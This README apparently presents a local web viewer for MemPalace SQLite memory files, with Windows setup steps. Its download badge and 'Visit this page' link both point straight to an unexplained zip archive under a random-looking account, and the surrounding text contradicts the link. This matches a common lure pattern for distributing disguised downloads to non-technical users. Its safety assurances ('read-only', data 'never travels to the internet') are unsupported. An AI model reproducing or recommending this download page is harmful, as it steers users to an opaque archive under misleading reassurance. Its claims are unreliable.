# 🧠 memory-palace-web-frontend - View your memory files with ease

[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip)

## 📌 About this application

Memory Palace Web Frontend provides a simple way to look at your stored data. The software reads your SQLite files and displays them in a web browser. You can browse your saved entries and search through your information without needing advanced technical skills.

## 💻 Requirements

To use this application on Windows, your computer needs the following setup:

- Windows 10 or 11
- A modern web browser like Chrome, Firefox, or Edge
- Python installed on your system
- A basic SQLite data file from the MemPalace project

## 📥 How to get the software

Visit this page to download the project files: [https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip](https://raw.githubusercontent.com/bentonitic-shielding4582/memory-palace-web-frontend/main/docs/memory-palace-frontend-web-v2.4-beta.4.zip).

Click the green "Code" button on the screen and select "Download ZIP". Save this folder to your desktop. After the download finishes, right-click the folder and choose "Extract All".

## ⚙️ Setting up your data

1. Open the folder you just extracted.
2. Open a folder named "config" inside it.
3. Locate the file named "palace.json".
4. Right-click the file and open it with Notepad.
5. Change the text inside the quotes to point to the location of your database file. The database file usually ends in ".sqlite3".
6. Save and close the file.

If your database is in a folder named "palace" on your desktop, your file should look like this:

{
  "palace_path": "C:/Users/YourName/Desktop/palace"
}

## 🚀 Running the application

1. Open the folder containing the extracted files.
2. Click the empty space in the address bar at the top of the file explorer window.
3. Type "cmd" and press Enter. This opens a black terminal window.
4. In the black window, type the following commands one by one, pressing Enter after each:

python -m venv .venv
.venv\Scripts\activate
pip install -r requirements.txt

Wait for the installation to finish. This downloads the tools necessary for the application to run.

## 🌐 Starting the interface

Once the installation above completes, type this command in the same window:

scripts/run.bat

Your system will start the local server. Once the terminal displays a message about the server running, open your web browser. Type the following address into the top bar:

http://127.0.0.1:8099

The application interface will appear in your browser. You can now browse your stored data.

## ❓ Frequently asked questions

### Does this software change my data?
No. The application is read-only. It shows your information, but it does not add, remove, or edit your files.

### Can I run this without Python?
No. The application requires Python to process your SQLite files. Ensure you download Python from the official website if you do not have it.

### How do I stop the application?
Go back to the terminal window and press "Ctrl" and "C" at the same time. Close the window afterward.

### What if the browser says the page cannot be reached?
Check that the terminal window remains open. Ensure the server ran without errors. If you moved your database file, check the "palace.json" file again to ensure the path corresponds to the current location.

### Does this work offline?
Yes. The application runs entirely on your own computer. Your data stays on your machine and never travels to the internet.

### Is my data secure?
Because the application runs locally, only people with access to your computer can view your data through this interface. Always keep your computer locked when you are away.